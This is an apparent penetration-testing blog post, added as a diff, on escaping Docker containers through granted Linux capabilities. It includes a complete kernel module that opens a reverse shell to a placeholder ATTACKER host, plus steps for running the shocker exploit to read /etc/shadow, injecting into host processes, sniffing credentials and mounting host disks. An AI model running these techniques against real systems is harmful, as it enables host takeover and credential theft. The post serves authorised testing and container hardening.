@@ -1,0 +1,133 @@
+---
+title: "Abusing Linux capabilities in Docker containers"
+description: "How CAP_SYS_MODULE, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, and CAP_NET_RAW turn small capability grants into host compromise, and how to read capability sets from inside a container."
+date: 2022-02-20
+seriesSlug: "docker-offensive"
+seriesTitle: "Attacking Docker"
+seriesPart: 3
+seriesDescription: "Offensive Docker: container triage through escape paths, capabilities, registries, and runtime abuse."
+tags: ["docker", "container-escape", "linux", "capabilities", "docker-offensive"]
+---
+
+> Lab notes from authorised assessments and training environments. Do not point these techniques at systems you do not own or have written permission to test.
+
+`--privileged` is the sledgehammer, but most real-world mistakes are smaller: someone added one capability to make a container work and never removed it. Linux exposes roughly forty capabilities ([man7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)); a handful of them are enough to escape when combined with host mounts or shared namespaces. This post is part 3 of Attacking Docker and assumes you already ran the [triage block](/blog/docker-pentest-playbook/).
+
+## Reading capability sets
+
+Every process carries multiple capability sets. The ones I care about during container reviews:
+
+| Set | Meaning |
+|-----|---------|
+| **CapEff** (Effective) | Checked when the process performs a privileged action |
+| **CapPrm** (Permitted) | Can be moved into effective via `capset()` |
+| **CapBnd** (Bounding) | Upper limit; capabilities dropped here cannot return |
+| **CapInh** (Inherited) | Passed to children on `execve` |
+
+```bash
+capsh --print
+grep Cap /proc/self/status
+capsh --decode=0000003fffffffff
+getpcaps $(pgrep nginx)
+```
+
+To find binaries on disk that carry file capabilities:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+If `capsh` is missing from the image, I copy a static build or read `/proc/self/status` directly and decode with `capsh --decode` on my attacker box.
+
+## Capability-aware binaries
+
+Some programs like `ping` are capability-aware: they acquire only `CAP_NET_RAW` for the syscall they need and drop it afterward. That design reduces attack surface compared to setuid root binaries. The lesson for defenders is that granting file capabilities to custom binaries is still risky if the binary has memory corruption bugs; for attackers it means `getcap -r /` is worth running even when the container looks unprivileged.
+
+## CAP_SYS_MODULE: kernel module load
+
+`CAP_SYS_MODULE` allows loading and unloading kernel modules. In a container with this capability (or full `--privileged`), I can compile a tiny module that spawns a userland process via `call_usermodehelper`:
+
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+
+MODULE_LICENSE("GPL");
+
+char *argv[] = {"/bin/bash", "-c",
+    "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", NULL};
+static char *envp[] = {
+    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+
+static int __init mod_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit mod_exit(void) { }
+module_init(mod_init);
+module_exit(mod_exit);
+```
+
+```makefile
+obj-m += reverse-shell.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+```bash
+make
+insmod reverse-shell.ko
+```
+
+Lab only, but I still see `--cap-add SYS_MODULE` in manifests where someone needed one kernel feature and did not want full `--privileged`. The same technique appears in [Kubernetes pod escapes](/blog/kubernetes-pod-escapes/) when pods receive the capability through the security context.
+
+## CAP_SYS_PTRACE with host PID namespace
+
+When a container runs with `--pid=host` and `CAP_SYS_PTRACE`, it can attach to processes on the host. That combination shows up in debugging and APM sidecars.
+
+```bash
+docker run -d --pid=host --cap-add SYS_PTRACE myimage
+ps aux
+```
+
+From there the attack is classic process injection: identify a root-owned process, inject shellcode or use `gdb`/`ptrace` to redirect execution, and connect to a bind shell. The capability does not mount the filesystem for you; it gives you the host process tree as an injection surface.
+
+## CAP_DAC_READ_SEARCH and CAP_DAC_OVERRIDE (shocker)
+
+`CAP_DAC_READ_SEARCH` and `CAP_DAC_OVERRIDE` bypass file permission checks. In Docker this often pairs with a writable layer or a mis-mounted host path. The classic exploit is [shocker.c](https://github.com/payoto/docker-escape-shocker), originally from the Docker breakout challenge, which abuses the capability against the container filesystem layout to read host files like `/etc/shadow`.
+
+```bash
+getcap -r / 2>/dev/null
+# if DAC_* caps present, fetch and compile shocker.c
+gcc shocker.c -o shocker
+./shocker
+```
+
+If I can read shadow and the hash is weak, host SSH becomes the next step.
+
+## CAP_NET_RAW: sniffing shared interfaces
+
+`CAP_NET_RAW` allows raw sockets. On containers that share the host network namespace or bridge-attached interfaces, I use it to capture traffic that includes credentials, session tokens, or registry auth headers:
+
+```bash
+tcpdump -i eth0 -w capture.pcap
+```
+
+Wireshark on the capture often beats hours of application fuzzing when internal services speak HTTP without TLS.
+
+## CAP_SYS_ADMIN without full privileged
+
+`CAP_SYS_ADMIN` is a grab bag: mount, umount, sethostname, and many `ioctl`s. In containers where `/dev` is visible, it is often enough to mount a host block device even without the full privileged flag:
+
+```bash
+mount /dev/sda1 /mnt
+cat /mnt/root/.ssh/authorized_keys
+```
+
+See [escape paths](/blog/docker-escape-paths/) for the privileged-container variant of the same disk mount.
+
+## What defenders should do
+
+Capabilities are finer-grained than `--privileged`, but "finer" does not mean safe. I recommend `--cap-drop=ALL` and adding back individual capabilities with documented justification, then verifying with [amicontained](https://github.com/genuinetools/amicontained). The [Docker security documentation](https://docs.docker.com/engine/security/) and [CIS Docker Benchmark](https://github.com/docker/docker-bench-security) both call out dangerous capability combinations.
+
+Next: [containerd, runc, and chroot breakouts](/blog/docker-runtime-without-docker/) when the Docker CLI is not in the picture.
